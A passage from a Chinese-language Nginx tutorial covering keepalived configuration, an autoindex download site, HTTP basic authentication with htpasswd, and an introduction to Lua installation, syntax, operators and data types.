class="hljs-number">-20</span>#权重的计算方式<br>&#125;<br>vrrp_instance VI_1 &#123;<br>    state MASTER<br>    <span class="hljs-keyword">interface</span> <span class="hljs-symbol">ens33</span><br>    <span class="hljs-symbol">virtual_router_id</span> <span class="hljs-symbol">10</span><br>    <span class="hljs-symbol">priority</span> <span class="hljs-symbol">100</span><br>    <span class="hljs-symbol">advert_int</span> <span class="hljs-symbol">1</span><br>    <span class="hljs-symbol">authentication</span> &#123;<br>        auth_type PASS<br>        auth_pass <span class="hljs-number">1111</span><br>    &#125;<br>    virtual_ipaddress &#123;<br>        <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.111</span><br>    &#125;<br>    track_script &#123;<br>      ck_nginx<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>如果效果没有出来，可以使用 <code>tail -f /var/log/messages</code>查看日志信息，找对应的错误信息。</li><li>测试</li></ol><p>问题思考:</p><p>通常如果master服务死掉后backup会变成master，但是当master服务又好了的时候 master此时会抢占VIP，这样就会发生两次切换对业务繁忙的网站来说是不好的。所以我们要在配置文件加入 nopreempt 非抢占，但是这个参数只能用于state 为backup，故我们在用HA的时候最好master 和backup的state都设置成backup 让其通过priority来竞争。</p><h1 id="nginx制作下载站点"><a class="markdownIt-Anchor" href="#nginx制作下载站点"></a> Nginx制作下载站点</h1><p>首先我们先要清楚什么是下载站点?</p><p>我们先来看一个网站<code>http://nginx.org/download/</code>这个我们刚开始学习Nginx的时候给大家看过这样的网站，该网站主要就是用来提供用户来下载相关资源的网站，就叫做下载网站。</p><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583825943945.png" alt="1583825943945" /></p><p>如何制作一个下载站点:</p><p>nginx使用的是模块ngx_http_autoindex_module来实现的，该模块处理以斜杠(&quot;/&quot;)结尾的请求，并生成目录列表。</p><p>nginx编译的时候会自动加载该模块，但是该模块默认是关闭的，我们需要使用下来指令来完成对应的配置</p><p>（1）autoindex:启用或禁用目录列表输出</p><table><thead><tr><th>语法</th><th>autoindex on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>autoindex off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>（2）autoindex_exact_size:对应HTLM格式，指定是否在目录列表展示文件的详细大小</p><p>默认为on，显示出文件的确切大小，单位是bytes。<br />改为off后，显示出文件的大概大小，单位是kB或者MB或者GB</p><table><thead><tr><th>语法</th><th>autoindex_exact_size  on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>autoindex_exact_size  on;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>（3）autoindex_format：设置目录列表的格式</p><table><thead><tr><th>语法</th><th>autoindex_format html|xml|json|jsonp;</th></tr></thead><tbody><tr><td>默认值</td><td>autoindex_format html;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>注意:该指令在1.7.9及以后版本中出现</p><p>（4）autoindex_localtime:对应HTML格式，是否在目录列表上显示时间。</p><p>默认为off，显示的文件时间为GMT时间。<br />改为on后，显示的文件时间为文件的服务器时间</p><table><thead><tr><th>语法</th><th>autoindex_localtime on | off;</th></tr></thead><tbody><tr><td>默认值</td><td>autoindex_localtime off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>配置方式如下:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /download&#123;<br>    <span class="hljs-attribute">root</span> /usr/local;<br>    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_exact_size</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_format</span> html;<br>    <span class="hljs-attribute">autoindex_localtime</span> <span class="hljs-literal">on</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>XML/JSON格式[一般不用这两种方式]</p><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583828317365.png" alt="1583828317365" /></p><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583828335279.png" alt="1583828335279" /></p><h1 id="nginx的用户认证模块"><a class="markdownIt-Anchor" href="#nginx的用户认证模块"></a> Nginx的用户认证模块</h1><p>对应系统资源的访问，我们往往需要限制谁能访问，谁不能访问。这块就是我们通常所说的认证部分，认证需要做的就是根据用户输入的用户名和密码来判定用户是否为合法用户，如果是则放行访问，如果不是则拒绝访问。</p><p>Nginx对应用户认证这块是通过ngx_http_auth_basic_module模块来实现的，它允许通过使用&quot;HTTP基本身份验证&quot;协议验证用户名和密码来限制对资源的访问。默认情况下nginx是已经安装了该模块，如果不需要则使用–without-http_auth_basic_module。</p><p>该模块的指令比较简单，</p><p>（1）auth_basic:使用“ HTTP基本认证”协议启用用户名和密码的验证</p><table><thead><tr><th>语法</th><th>auth_basic string|off;</th></tr></thead><tbody><tr><td>默认值</td><td>auth_basic off;</td></tr><tr><td>位置</td><td>http,server,location,limit_except</td></tr></tbody></table><p>开启后，服务端会返回401，指定的字符串会返回到客户端，给用户以提示信息，但是不同的浏览器对内容的展示不一致。</p><p>（2）auth_basic_user_file:指定用户名和密码所在文件</p><table><thead><tr><th>语法</th><th>auth_basic_user_file file;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http,server,location,limit_except</td></tr></tbody></table><p>指定文件路径，该文件中的用户名和密码的设置，密码需要进行加密。可以采用工具自动生成</p><p>实现步骤:</p><p>1.nginx.conf添加如下内容</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /download&#123;<br>    <span class="hljs-attribute">root</span> /usr/local;<br>    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_exact_size</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">autoindex_format</span> html;<br>    <span class="hljs-attribute">autoindex_localtime</span> <span class="hljs-literal">on</span>;<br>    <span class="hljs-attribute">auth_basic</span> <span class="hljs-string">&#x27;please input your auth&#x27;</span>;<br>    <span class="hljs-attribute">auth_basic_user_file</span> htpasswd;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.我们需要使用<code>htpasswd</code>工具生成</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y httpd-tools<br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">htpasswd -c <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username <span class="hljs-comment">//创建一个新文件记录用户名和密码</span><br>htpasswd -b <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username password <span class="hljs-comment">//在指定文件新增一个用户名和密码</span><br>htpasswd -D <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username <span class="hljs-comment">//从指定文件删除一个用户信息</span><br>htpasswd -v <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/htpasswd username <span class="hljs-comment">//验证用户名和密码是否正确</span><br></code></pre></td></tr></table></figure><p><img src="F:%5C%E4%B8%8A%E8%AF%BE%E5%86%85%E5%AE%B9%5Cdoc%5CNginx%5CNginx%5Cassets%5C1583850151467.png" alt="1583850151467" /></p><p>上述方式虽然能实现用户名和密码的验证，但是大家也看到了，所有的用户名和密码信息都记录在文件里面，如果用户量过大的话，这种方式就显得有点麻烦了，这时候我们就得通过后台业务代码来进行用户权限的校验了。</p><h1 id="nginx的扩展模块"><a class="markdownIt-Anchor" href="#nginx的扩展模块"></a> Nginx的扩展模块</h1><p>Nginx是可扩展的，可用于处理各种使用场景。本节中，我们将探讨使用Lua扩展Nginx的功能。</p><h2 id="lua"><a class="markdownIt-Anchor" href="#lua"></a> Lua</h2><h3 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h3><p>Lua是一种轻量、小巧的脚本语言，用标准C语言编写并以源代码形式开发。设计的目的是为了嵌入到其他应用程序中，从而为应用程序提供灵活的扩展和定制功能。</p><h3 id="特性"><a class="markdownIt-Anchor" href="#特性"></a> 特性</h3><p>跟其他语言进行比较，Lua有其自身的特点：</p><p>（1）轻量级</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Lua</span>用标准<span class="hljs-built_in">C</span>语言编写并以源代码形式开发，编译后仅仅一百余千字节，可以很方便的嵌入到其他程序中。<br></code></pre></td></tr></table></figure><p>（2）可扩展</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Lua</span>提供非常丰富易于使用的扩展接口和机制，由宿主语言<span class="hljs-punctuation">(</span>通常是<span class="hljs-built_in">C</span>或<span class="hljs-built_in">C</span><span class="hljs-operator">++</span><span class="hljs-punctuation">)</span>提供功能，<span class="hljs-variable">Lua</span>可以使用它们，就像内置的功能一样。<br></code></pre></td></tr></table></figure><p>（3）支持面向过程编程和函数式编程</p><h3 id="应用场景"><a class="markdownIt-Anchor" href="#应用场景"></a> 应用场景</h3><p>Lua在不同的系统中得到大量应用，场景的应用场景如下:</p><p>游戏开发、独立应用脚本、web应用脚本、扩展和数据库插件、系统安全上。</p><h3 id="lua的安装"><a class="markdownIt-Anchor" href="#lua的安装"></a> Lua的安装</h3><p>在linux上安装Lua非常简单，只需要下载源码包并在终端解压、编译即可使用。</p><p>Lua的官网地址为:<code>https://www.lua.org</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604649954522.png" alt="1604649954522" /></p><ol><li>点击download可以找到对应版本的下载地址，我们本次课程采用的是lua-5.3.5,其对应的资源链接地址为https://www.lua.org/ftp/lua-5.4.1.tar.gz,也可以使用wget命令直接下载:</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>www.lua.org<span class="hljs-regexp">/ftp/</span>lua-<span class="hljs-number">5.4</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><ol start="2"><li>编译安装</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> <span class="hljs-keyword">lua</span>-<span class="hljs-number">5.4</span>.<span class="hljs-number">1</span><br><span class="hljs-keyword">make</span> linux test<br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>如果在执行make linux test失败，报如下错误:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650028960.png" alt="1604650028960" /></p><p>说明当前系统缺少libreadline-dev依赖包，需要通过命令来进行安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y readline-devel<br></code></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">lua -v</span><br></code></pre></td></tr></table></figure><h3 id="lua的语法"><a class="markdownIt-Anchor" href="#lua的语法"></a> Lua的语法</h3><p>Lua和C/C<ins>语法非常相似，整体上比较清晰，简洁。条件语句、循环语句、函数调用都与C/C</ins>基本一致。如果对C/C++不太熟悉的同学来说，也没关系，因为天下语言是一家，基本上理解起来都不会太困难。我们一点点来讲。</p><h4 id="第一个lua程序"><a class="markdownIt-Anchor" href="#第一个lua程序"></a> 第一个Lua程序</h4><p>大家需要知道的是，Lua有两种交互方式，分别是:交互式和脚本式，这两者的区别，下面我们分别来讲解下：</p><p>交互式之HELLOWORLD</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">交互式是指可以在命令行输入程序，然后回车就可以看到运行的效果。<br></code></pre></td></tr></table></figure><p>Lua交互式编程模式可以通过命令lua -i 或lua来启用:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650075000.png" alt="1604650075000" /></p><p>在命令行中key输入如下命令，并按回车,会有输出在控制台：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650092413.png" alt="1604650092413" /></p><p>脚本式之HELLOWORLD</p><p>脚本式是将代码保存到一个以lua为扩展名的文件中并执行的方式。</p><p>方式一:</p><p>我们需要一个文件名为 hello.lua,在文件中添加要执行的代码，然后通过命令 <code>lua hello.lua</code>来执行，会在控制台输出对应的结果。</p><p>hello.lua</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello World!!&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650118205.png" alt="1604650118205" /></p><p>方式二:</p><p>将hello.lua做如下修改</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/local/bin/lua</span><br>print(<span class="hljs-string">&quot;Hello World!!!&quot;</span>)<br></code></pre></td></tr></table></figure><p>第一行用来指定Lua解释器所在位置为 /usr/local/bin/lua，加上#号标记解释器会忽略它。一般情况下#!就是用来指定用哪个程序来运行本文件。但是hello.lua并不是一个可执行文件，需要通过chmod来设置可执行权限，最简单的方式为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">755</span> hello.lua<br></code></pre></td></tr></table></figure><p>然后执行该文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./hello.lua<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650152287.png" alt="1604650152287" /></p><p>补充一点，如果想在交互式中运行脚本式的hello.lua中的内容，我们可以使用一个dofile函数，如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dofile</span><span class="hljs-params">(<span class="hljs-string">&quot;lua_demo/hello.lua&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>注意:在Lua语言中，连续语句之间的分隔符并不是必须的，也就是说后面不需要加分号，当然加上也不会报错，</p><p>在Lua语言中，表达式之间的换行也起不到任何作用。如以下四个写法，其实都是等效的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">写法一<br><span class="hljs-attribute">a</span>=1<br><span class="hljs-attribute">b</span>=a+2<br>写法二<br><span class="hljs-attribute">a</span>=1;<br><span class="hljs-attribute">b</span>=a+2;<br>写法三<br><span class="hljs-attribute">a</span>=1; <span class="hljs-attribute">b</span>=a+2;<br>写法四<br><span class="hljs-attribute">a</span>=1 <span class="hljs-attribute">b</span>=a+2<br></code></pre></td></tr></table></figure><p>不建议使用第四种方式，可读性太差。</p><h4 id="lua的注释"><a class="markdownIt-Anchor" href="#lua的注释"></a> Lua的注释</h4><p>关于Lua的注释要分两种，第一种是单行注释，第二种是多行注释。</p><p>单行注释的语法为：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--注释内容</span><br></code></pre></td></tr></table></figure><p>多行注释的语法为:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-comment">--[[</span><br><span class="hljs-comment">注释内容</span><br><span class="hljs-comment">注释内容</span><br><span class="hljs-comment">--]]</span><br></code></pre></td></tr></table></figure><p>如果想取消多行注释，只需要在第一个–之前在加一个-即可，如：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">---[[</span><br>注释内容<br>注释内容<br><span class="hljs-comment">--]]</span><br></code></pre></td></tr></table></figure><h4 id="标识符"><a class="markdownIt-Anchor" href="#标识符"></a> 标识符</h4><p>换句话说标识符就是我们的变量名，Lua定义变量名以一个字母 A 到 Z 或 a 到 z 或下划线 _ 开头后加上0个或多个字母，下划线，数字（0到9）。这块建议大家最好不要使用下划线加大写字母的标识符，因为Lua的保留字也是这样定义的，容易发生冲突。注意Lua是区分大小写字母的。</p><p><u>A</u>0</p><h4 id="关键字"><a class="markdownIt-Anchor" href="#关键字"></a> 关键字</h4><p>下列是Lua的关键字，大家在定义常量、变量或其他用户自定义标识符都要避免使用以下这些关键字：</p><table><thead><tr><th>and</th><th>break</th><th>do</th><th>else</th></tr></thead><tbody><tr><td>elseif</td><td>end</td><td>false</td><td>for</td></tr><tr><td>function</td><td>if</td><td>in</td><td>local</td></tr><tr><td>nil</td><td>not</td><td>or</td><td>repeat</td></tr><tr><td>return</td><td>then</td><td>true</td><td>until</td></tr><tr><td>while</td><td>goto</td><td></td><td></td></tr></tbody></table><p>一般约定，以下划线开头连接一串大写字母的名字（比如 _VERSION）被保留用于 Lua 内部全局变量。这个也是上面我们不建议这么定义标识符的原因。</p><h4 id="运算符"><a class="markdownIt-Anchor" href="#运算符"></a> 运算符</h4><p>Lua中支持的运算符有算术运算符、关系运算符、逻辑运算符、其他运算符。</p><p>算术运算符:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">+</span>   加法<br><span class="hljs-bullet">-</span>减法<br><span class="hljs-bullet">*</span>乘法<br>/除法<br>%取余<br>^乘幂<br><span class="hljs-bullet">-</span>负号<br></code></pre></td></tr></table></figure><p>例如:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">10</span>+<span class="hljs-number">20</span><span class="hljs-comment">--&gt;30</span><br><span class="hljs-number">20</span>-<span class="hljs-number">10</span><span class="hljs-comment">--&gt;10</span><br><span class="hljs-number">10</span>*<span class="hljs-number">20</span><span class="hljs-comment">--&gt;200</span><br><span class="hljs-number">20</span>/<span class="hljs-number">10</span><span class="hljs-comment">--&gt;2</span><br><span class="hljs-number">3</span>%<span class="hljs-number">2</span><span class="hljs-comment">--&gt;1</span><br><span class="hljs-number">10</span>^<span class="hljs-number">2</span><span class="hljs-comment">--&gt;100</span><br>-<span class="hljs-number">10</span><span class="hljs-comment">--&gt;-10</span><br></code></pre></td></tr></table></figure><p>关系运算符</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">==等于</span><br>~=不等于<br>&gt;大于<br>&lt;小于<br>&gt;=大于等于<br>&lt;=小于等于<br></code></pre></td></tr></table></figure><p>例如:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">10</span>==<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">true</span><br><span class="hljs-number">10</span>~=<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">false</span><br><span class="hljs-number">20</span>&gt;<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">true</span><br><span class="hljs-number">20</span>&lt;<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">false</span><br><span class="hljs-number">20</span>&gt;=<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">true</span><br><span class="hljs-number">20</span>&lt;=<span class="hljs-number">10</span>--&gt;<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>逻辑运算符</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">and</span>逻辑与 A <span class="hljs-keyword">and </span><span class="hljs-keyword">B </span>    &amp;&amp;   <br><span class="hljs-keyword">or</span>逻辑或 A <span class="hljs-keyword">or </span><span class="hljs-keyword">B </span>    <span class="hljs-title">||</span><br>not逻辑非  取反，如果为true,则返回false  !<br></code></pre></td></tr></table></figure><p>逻辑运算符可以作为if的判断条件，返回的结果如下:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xl">A = <span class="hljs-literal">true</span><br>B = <span class="hljs-literal">true</span><br><br>A <span class="hljs-function"><span class="hljs-title">and</span> B--&gt;</span><span class="hljs-literal">true</span><br>A <span class="hljs-function"><span class="hljs-title">or</span>  B --&gt;</span><span class="hljs-literal">true</span><br><span class="hljs-function"><span class="hljs-title">not</span> A --&gt;</span><span class="hljs-literal">false</span><br><br>A = <span class="hljs-literal">true</span><br>B = <span class="hljs-literal">false</span><br><br>A <span class="hljs-function"><span class="hljs-title">and</span> B--&gt;</span><span class="hljs-literal">false</span><br>A <span class="hljs-function"><span class="hljs-title">or</span>  B --&gt;</span><span class="hljs-literal">true</span><br><span class="hljs-function"><span class="hljs-title">not</span> A --&gt;</span><span class="hljs-literal">false</span><br><br>A = <span class="hljs-literal">false</span><br>B = <span class="hljs-literal">true</span><br><br>A <span class="hljs-function"><span class="hljs-title">and</span> B--&gt;</span><span class="hljs-literal">false</span><br>A <span class="hljs-function"><span class="hljs-title">or</span>  B --&gt;</span><span class="hljs-literal">true</span><br><span class="hljs-function"><span class="hljs-title">not</span> A --&gt;</span><span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure><p>其他运算符</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">..</span>连接两个字符串<br><span class="hljs-comment">#一元预算法，返回字符串或表的长度</span><br></code></pre></td></tr></table></figure><p>例如:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;HELLO &quot;</span>..<span class="hljs-string">&quot;WORLD&quot;</span>--&gt;<span class="hljs-variable constant_">HELLO</span> <span class="hljs-variable constant_">WORLD</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">#<span class="hljs-string">&quot;HELLO&quot;</span>--&gt;<span class="hljs-number">5</span></span><br></code></pre></td></tr></table></figure><h4 id="全局变量局部变量"><a class="markdownIt-Anchor" href="#全局变量局部变量"></a> 全局变量&amp;局部变量</h4><p>在Lua语言中，全局变量无须声明即可使用。在默认情况下，变量总是认为是全局的，如果未提前赋值，默认为nil:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650220670.png" alt="1604650220670" /></p><p>要想声明一个局部变量，需要使用local来声明</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604650235860.png" alt="1604650235860" /></p><h4 id="lua数据类型"><a class="markdownIt-Anchor" href="#lua数据类型"></a> Lua数据类型</h4><p>Lua有8个数据类型</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">nil</span><span class="hljs-params">(空，无效值)</span></span><br><span class="hljs-function"><span class="hljs-title">boolean</span><span class="hljs-params">(布尔，true/false)</span></span><br><span class="hljs-function"><span class="hljs-title">number</span><span class="hljs-params">(数值)</span></span><br><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(字符串)</span></span><br><span class="hljs-function"><span class="hljs-title">function</span><span class="hljs-params">(函数)</span></span><br>table（表）<br><span class="hljs-function"><span class="hljs-title">thread</span><span class="hljs-params">(线程)</span></span><br>userdata（用户数据）<br></code></pre></td></tr></table></figure><p>可以使用type函数测试给定变量或者的类型：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(nil))</span>--&gt;</span>nil<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-literal">true</span>))</span>               --&gt;</span> boolean<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-number">1.1</span>*<span class="hljs-number">1.1</span>))</span>             --&gt;</span> number<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-string">&quot;Hello world&quot;</span>))</span>      --&gt;</span> string<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(io.stdin))</span>--&gt;</span>userdata<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(<span class="hljs-built_in">print</span>))</span>              --&gt;</span> <span class="hljs-keyword">function</span><br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(type))</span>               --&gt;</span><span class="hljs-keyword">function</span><br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type&#123;&#125;)</span>--&gt;</span>table<br><span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(type(type(X)))</span>            --&gt;</span> string<br></code></pre></td></tr></table></figure><h5 id="nil"><a class="markdownIt-Anchor" href="#nil"></a> nil</h5><p>nil是一种只有一个nil值的类型，它的作用可以用来与其他所有值进行区分，也可以当想要移除一个变量时，只需要将该变量名赋值为nil,垃圾回收就会会释放该变量所占用的内存。</p><h5 id="boolean"><a class="markdownIt-Anchor" href="#boolean"></a> boolean</h5><p>boolean类型具有两个值，true和false。boolean类型一般被用来做条件判断的真与假。在Lua语言中，只会将false和nil视为假，其他的都视为真，特别是在条件检测中0和空字符串都会认为是真，这个和我们熟悉的大多数语言不太一样。</p><h5 id="number"><a class="markdownIt-Anchor" href="#number"></a> number</h5><p>在Lua5.3版本开始，Lua语言为数值格式提供了两种选择:integer(整型)和float(双精度浮点型)[和其他语言不太一样，float不代表单精度类型]。</p><p>数值常量的表示方式:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">&gt;<span class="hljs-number">4</span><span class="hljs-comment">--&gt;4</span><br>&gt;<span class="hljs-number">0.4</span><span class="hljs-comment">--&gt;0.4</span><br>&gt;<span class="hljs-number">4.75e-3</span><span class="hljs-comment">--&gt;0.00475</span><br>&gt;<span class="hljs-number">4.75e3</span><span class="hljs-comment">--&gt;4750</span><br></code></pre></td></tr></table></figure><p>不管是整型还是双精度浮点型，使用type()函数来取其类型，都会返回的是number</p><figure 